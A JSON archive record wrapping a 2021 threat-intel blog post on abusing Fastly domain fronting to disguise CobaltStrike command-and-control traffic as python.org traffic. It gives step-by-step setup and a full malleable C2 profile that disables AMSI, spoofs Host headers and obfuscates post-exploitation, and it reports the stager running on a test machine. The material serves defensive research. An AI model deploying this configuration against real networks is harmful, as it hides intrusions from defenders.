@@ -1,0 +1,95 @@
+{
+    "id": "3ad09d80-0493-45de-8c63-43b87b4eaf04",
+    "created_at": "2023-01-12T15:00:12.390746Z",
+    "updated_at": "2025-03-27T02:09:55.020832Z",
+    "deleted_at": null,
+    "sha1_hash": "1d60cbe5b8c30db3b5b330ef579e0945e6b82e90",
+    "title": "2021-11-13 - Threat Spotlight - Domain Fronting",
+    "authors": "",
+    "file_creation_date": "2022-05-28T02:47:06Z",
+    "file_modification_date": "2022-05-28T02:47:06Z",
+    "file_size": 705696,
+    "plain_text": "# Threat Spotlight - Domain Fronting\n\n**[stillu.cc/threat-spotlight/2021/11/13/domain-fronting-fastly/](https://stillu.cc/threat-spotlight/2021/11/13/domain-fronting-fastly/)**\n\nNovember 13, 2021\n\nDomain fronting is a common technique that is sometimes used by threat actors to disguise\ntheir traffic as the real deal. Essentially, what it is is communicate with legitimate-looking\ndomains when reality, the traffic is being pointed to threat actor’s C2 stations. A common\nexample would be using legitimate or reputable domains with a custom `Host header to`\nredirect the traffic to threat actor’s stations. There are many examples out there that abuse\n[services like Cloudflare,](https://digi.ninja/blog/cloudflare_example.php) [CloudFront, and such.](https://digi.ninja/blog/cloudfront_example.php)\n\nIn today’s example, we’ll be using Fastly as an example. Fastly provides a service that’s\nmore or less intended to act as a CDN, where you can create a service and tie it to your\nbackend. As you can imagine, a company as large as Fastly (that was able to bring half the\nInternet with it when it went down), there are probably more than thousands of people using\ntheir services - and indeed there are.\n\n\n-----\n\nYou can do a quick search using services like RiskIQ to look through all of the subdomains\nassociated with `*.fastly.net . While` [it appears we’re not the first to discover this, there](https://fortynorthsecurity.com/blog/fastly-and-fronting/)\naren’t a whole lot of other resources out there talking about abusing Fastly as a service.\n\nAnd Python Software Foundation just so happens to use it too!\n\n\n-----\n\nWhat actually happens is when you contact `python.org, it actually gets interpreted as`\n```\npython.org.prod.global.fastly.net internally based on the Host header. This was\n\n```\nactually brought to our attention a while back when my colleagues discovered there were\nCobaltStrike beacons in the wild that appear to connect to Python-related domains at\nexecution, and upon further investigation, we realized they were abusing the nature of Fastly\nservices to disguise their traffic. So I decided to do a little experiment this weekend to see if I\ncan recreate that myself.\n\nTo get started, I created a new service on Fastly called `dl-python.org, a service name`\n(and in turn, a domain name) that appears to be similar enough to the real deal, but doesn’t\nactually exist (and it doesn’t need to be!).\n\nCreate a new service that appears to be genuine enough to the target domain name. In this\ncase, `dl-python.org . Note that while` `dl-python.org appears to be actually owned by`\n\n\n-----\n\nsomeone else, I don t actually have access to it, nor will it actually make contact with the\ndomain (we'll get to that part later). You can name it whatever you want.\nNext, in the Host settings section, enter your actual C2’s domain name, something you have\nactual control over. In this case, `my-c2domain.com . I have the port set to` `55137, but it`\nshould be 443 ideally for HTTPS beacons. My 80/443 port was occupied by something else\nwhen I was experimenting with it.\n\nNext, we’re going to craft a new CobaltStrike Stager. Create a new Listener on your team\nserver with the vulnerable domain name as the C2, and enter your service name in the\n```\nHost field. To make the traffic look a little bit more genuine, you can also craft your own\n\n```\nmalleable C2 profile that has contents of Python docs inside.\n\n\n-----\n\n```\nset sleeptime 5000 ;\nset jitter  \"0\";\nset maxdns  \"255\";\nset useragent \"Mozilla/5.0 (Windows NT 6.0; Win64; x64; rv:96.0) Gecko/20100101\nFirefox/96.0\";\n# set host_stage \"false\";\npost-ex {\n     # control the temporary process we spawn to\n     set spawnto_x86 \"%ProgramFiles(x86)%\\\\Everything\\\\Everything.exe\";\n     set spawnto_x64 \"%ProgramFiles%\\\\Mozilla Firefox\\\\firefox.exe\";\n     # change the permissions and content of our post-ex DLLs\n     set obfuscate \"true\";\n     # pass key function pointers from Beacon to its child jobs\n     set smartinject \"true\";\n     # disable AMSI in powerpick, execute-assembly, and psinject\n     set amsi_disable \"true\";\n}\nhttp-config {\n     set headers \"Date, Server, Content-Length, Keep-Alive, Connection, ContentType\";\n     set trust_x_forwarded_for \"false\";\n     header \"Server\" \"nginx\";\n     header \"Keep-Alive\" \"timeout=5, max=100\";\n     header \"Connection\" \"Keep-Alive\";\n}\nhttp-get {\n  set uri \"/3/library/stdtypes.html\";\n  client {\n    header \"Accept\" \"*/*\";\n    header \"Host\" \"dl-python.org\";\n    metadata {\n      base64;\n      prepend \"session=\";\n      header \"Cookie\";\n    }\n  }\n  server {\n    header \"Server\" \"nginx\";\n    header \"Cache-Control\" \"max-age=0, no-cache\";\n    header \"Pragma\" \"no-cache\";\n    header \"Connection\" \"keep-alive\";\n    header \"Content-Type\" \"application/javascript; charset=utf-8\";\n    output {\n      base64url;\n      # the content was so long for my IDE that it actually hung when trying to\nparse it\n      # so I'm gonna leave this section to you\n\n```\n\n-----\n\n```\n      append ...html_head... ;\n      prepend \"...html_body...\";\n      print;\n    }\n  }\n}\nhttp-post {\n  set uri \"/3/library/struct.html\";\n  client {\n    header \"Accept\" \"*/*\";\n    header \"Host\" \"cobaltstrike.stillu.cc\";\n    id {\n      mask;\n      base64url;\n      parameter \"x-timer\";\n    }\n    output {\n      mask;\n      base64url;\n      parameter \"etag\";\n    }\n  }\n  server {\n    header \"Server\" \"nginx\";\n    header \"Cache-Control\" \"max-age=0, no-cache\";\n    header \"Pragma\" \"no-cache\";\n    header \"Connection\" \"keep-alive\";\n    header \"Content-Type\" \"application/javascript; charset=utf-8\";\n    output {\n      base64url;\n      append \"...html_head...\";\n      prepend \"...html_body...\";\n      print;\n    }\n  }\n}\n\n```\nAnd that’s it! Let’s try to run the stager on our victim machine.\n\n\n-----\n\nAs you can see, it worked! It looks like it’s contacting `docs.python.org (and it is), yet the`\nserver returned beacon information for the stager. Just not in plaintext because I had the\n```\nmask option enabled, otherwise the content should look almost like standard HTML content\n\n```\nwith random bits of information thrown in there because of the malleable C2 config above and this is with unencrypted traffic.\n\nThis trick is perfect for threat actors that want to evade IT admins’ attention as\n\nit appears to contact a real domain with benign URL\n( http://docs.python.org/3/library/stdtypes.html )\nit can be made to communicate in HTTPS, so the `Host header wouldn’t even show`\nup\nif the IT admin does manage to figure out it goes to `dl-`\n```\n   python.org.prod.global.fastly.net, it doesn’t reveal the actual C2 address still,\n\n```\nas the resolved IP would just be Fastly’s own CDN IP.\n\nThis entire thing was really fun to recreate and helped me understand CobaltStrike a little bit\nmore from attacker’s perspective, as I’ve always tackled CobaltStrike payloads from a Blue\nTeam’s perspective as a threat intel researcher. If you are in the same position as me, I also\nencourage you to give CobaltStrike a try and try to attack your own machines to see what\ntricks you can pull off (if your organization has access to such tool).\n\n**Leave a comment**\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-11-13 - Threat Spotlight - Domain Fronting.pdf"
+    ],
+    "report_names": [
+        "2021-11-13 - Threat Spotlight - Domain Fronting.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "67bf0462-41a3-4da5-b876-187e9ef7c375",
+            "created_at": "2022-10-25T16:07:23.44832Z",
+            "updated_at": "2025-03-27T02:02:09.806007Z",
+            "deleted_at": null,
+            "main_name": "Careto",
+            "aliases": [
+                "Careto",
+                "The Mask",
+                "Ugly Face"
+            ],
+            "source_name": "ETDA:Careto",
+            "tools": [
+                "Careto"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "610a7295-3139-4f34-8cec-b3da40add480",
+            "created_at": "2023-01-06T13:46:38.608142Z",
+            "updated_at": "2025-03-27T02:00:02.87217Z",
+            "deleted_at": null,
+            "main_name": "Cobalt",
+            "aliases": [
+                "Cobalt Gang",
+                "GOLD KINGSWOOD",
+                "COBALT SPIDER",
+                "G0080",
+                "Mule Libra",
+                "Cobalt Group"
+            ],
+            "source_name": "MISPGALAXY:Cobalt",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "f5bf6853-3f6e-452c-a7b7-8f81c9a27476",
+            "created_at": "2023-01-06T13:46:38.677391Z",
+            "updated_at": "2025-03-27T02:00:02.889755Z",
+            "deleted_at": null,
+            "main_name": "Careto",
+            "aliases": [
+                "The Mask",
+                "Ugly Face"
+            ],
+            "source_name": "MISPGALAXY:Careto",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535612,
+    "ts_updated_at": 1743041395,
+    "ts_creation_date": 1653706026,
+    "ts_modification_date": 1653706026,
+    "files": {
+        "pdf": "https://archive.orkl.eu/1d60cbe5b8c30db3b5b330ef579e0945e6b82e90.pdf",
+        "text": "https://archive.orkl.eu/1d60cbe5b8c30db3b5b330ef579e0945e6b82e90.txt",
+        "img": "https://archive.orkl.eu/1d60cbe5b8c30db3b5b330ef579e0945e6b82e90.jpg"
+    }
+}
